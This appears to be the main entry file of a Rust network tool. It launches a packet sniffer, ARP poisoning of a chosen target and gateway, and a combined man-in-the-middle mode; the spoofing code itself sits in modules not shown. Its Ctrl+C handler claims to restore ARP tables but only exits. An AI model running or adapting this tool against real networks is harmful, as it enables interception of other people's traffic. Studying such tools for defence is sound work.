mod sniffing;
mod ltm;

use sniffing::arp_spoofing::ArpSpoofer;
use sniffing::packet_sniffing::start_sniffer;
use pcap::Device;
use std::net::Ipv4Addr;
use std::thread;
use std::time::Duration;

fn main() {
    let args: Vec<String> = std::env::args().collect();

    println!("╔════════════════════════════════════════╗");
    println!("║   Network Security Tool v1.0           ║");
    println!("║   Sniffer + ARP Poisoning              ║");
    println!("╚════════════════════════════════════════╝\n");

    if args.len() < 2 {
        print_usage();
        return;
    }

    match args[1].as_str() {
        "sniff" => {
            start_sniffer(false, "", "");
        }
        "arp" => {
            if args.len() != 5 {
                println!("[!] Usage: sudo cargo run -- arp <interface> <target_ip> <gateway_ip>");
                return;
            }
            let interface = args[2].clone();
            let target_ip: Ipv4Addr = args[3].parse().expect("Invalid target IP");
            let gateway_ip: Ipv4Addr = args[4].parse().expect("Invalid gateway IP");

            let mut spoofer = ArpSpoofer::new(&interface, target_ip, gateway_ip)
                .expect("Failed to create ARP spoofer");
            spoofer.discover().expect("Failed to discover MAC addresses");

            ctrlc::set_handler(move || {
                println!("\n[!] Ctrl+C detected! Restoring ARP tables...");
                std::process::exit(0);
            }).expect("Error setting Ctrl-C handler");

            spoofer.start_poisoning().expect("ARP poisoning failed");
        }
        "mitm" => {
            if args.len() < 4 {
                println!("[!] Usage: sudo cargo run -- mitm <target_ip> <gateway_ip>");
                return;
            }
            let target_ip = args[2].clone();
            let gateway_ip = args[3].clone();
            let target_parsed: Ipv4Addr = target_ip.parse().expect("Invalid target IP");
            let gateway_parsed: Ipv4Addr = gateway_ip.parse().expect("Invalid gateway IP");

            println!("[*] Starting MITM attack...");
            thread::spawn(move || {
                let mut spoofer = ArpSpoofer::new("en0", target_parsed, gateway_parsed)
                    .expect("Failed to create ARP spoofer");
                spoofer.discover().expect("Failed to discover MAC addresses");
                spoofer.start_poisoning().ok();
            });

            thread::sleep(Duration::from_secs(3));
            start_sniffer(true, &target_ip, &gateway_ip);
        }
        "devices" => {
            list_devices();
        }
        _ => {
            println!("[!] Unknown command: {}", args[1]);
            print_usage();
        }
    }
}

fn list_devices() {
    match Device::list() {
        Ok(devices) => {
            println!("\nAvailable network devices:");
            for dev in devices {
                println!("  {} - {:?}", dev.name, dev.desc.unwrap_or_default());
            }
        }
        Err(e) => {
            println!("[!] Failed to list devices: {}", e);
        }
    }
}

fn print_usage() {
    println!("Usage:");
    println!("  sudo cargo run -- sniff                      # Start packet sniffer");
    println!("  sudo cargo run -- sniff -V                   # Sniffer with live visualization");
    println!("  sudo cargo run -- arp <iface> <target> <gw>   # ARP poisoning attack");
    println!("  sudo cargo run -- mitm <target> <gw>          # MITM attack (ARP + sniff)");
    println!("  cargo run -- devices                          # List network devices");
    println!("\nSniffer Options (with 'sniff' command):");
    println!("  -V, --visualize    Live visualization with bandwidth & packet rate");
    println!("  -v, --verbose      Verbose per-packet output");
    println!("  -d, --device <dev> Use specific network device (default: en0)");
    println!("  -p, --print        Print available devices");
}